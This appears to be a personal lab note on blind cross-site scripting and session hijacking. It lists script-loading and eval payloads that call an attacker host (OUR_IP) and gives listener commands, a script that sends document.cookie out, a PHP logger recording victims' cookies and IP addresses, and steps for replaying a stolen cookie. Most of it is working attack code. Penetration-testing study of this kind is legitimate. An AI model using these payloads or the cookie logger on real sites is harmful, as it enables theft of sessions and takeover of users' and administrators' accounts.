# Payloads
#### https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#blind-xss

```html
<script src=http://OUR_IP></script>
'><script src=http://OUR_IP></script>
"><script src=http://OUR_IP></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
<script>$.getScript("http://OUR_IP")</script>
```
# Overview

Modern web apps store **session IDs in cookies**. If an attacker steals these, they can **impersonate the victim**.  
In **Blind XSS**, payload execution happens in a **privileged context (e.g., Admin panel)** where the attacker has **no direct access**, but still wants to capture data like cookies.
### Setup: Start Listener on Attacker Server

```bash
mkdir /tmp/tmpserver
cd /tmp/tmpserver
sudo php -S 0.0.0.0:80
```
### Phase 1: Discovering Vulnerable Field (Blind XSS)

Use the payloads below **in different fields**, and identify which one triggers an HTTP request to attacker:

```html
<script src="http://YOUR_IP/fullname"></script>
<script src="http://YOUR_IP/username"></script>
```

If a field is vulnerable, you’ll see a request on your listener like:

```
[200] /username
```

> `email` can be skipped (validated), and `password` too (usually hashed).
### Phase 2: Stealing Session Cookie

1. Create `script.js` on attacker VM with:

```javascript
new Image().src='http://YOUR_IP/index.php?c='+document.cookie;
```

2. XSS payload becomes:   

```html
<script src="http://YOUR_IP/script.js"></script>
```
### Phase 3: Logging Cookies

**index.php** on attacker server:

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

Start PHP server again:

```bash
sudo php -S 0.0.0.0:80
```
### Phase 4: Using the Cookie

1. Open victim site (e.g., `/hijacking/login.php`)    
2. Press `Shift + F9` → Open **Storage** tab → Click `+`
3. Add:
    - **Name** = `cookie`
    - **Value** = `value_stolen_from_log`
4. Refresh page → Victim session hijacked.
# Tags
> #Exploitation #Web-Exploitation #XSS #Cookies #Session-Hijacking